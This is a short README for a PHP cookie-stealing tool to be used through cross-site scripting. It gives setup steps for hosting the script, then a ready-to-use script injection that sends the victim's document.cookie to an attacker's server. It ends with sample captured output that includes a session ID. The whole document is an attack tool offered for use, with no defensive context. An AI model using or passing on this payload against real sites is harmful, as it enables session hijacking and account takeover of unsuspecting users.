# CookieStealer.php
A PHP script to run on your server to grab cookies through xss.
Place in your webserver root folder, give permissions and start server

example injection:

<script> 
var i = new Image();
i.src="http://your_server.site/cookiestealer.php?g="+document.cookie;
</script>

example output:

Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
g=PHPSESSID=8lb9e51o6c4449rbjfhfi1prru4
192.168.1.69
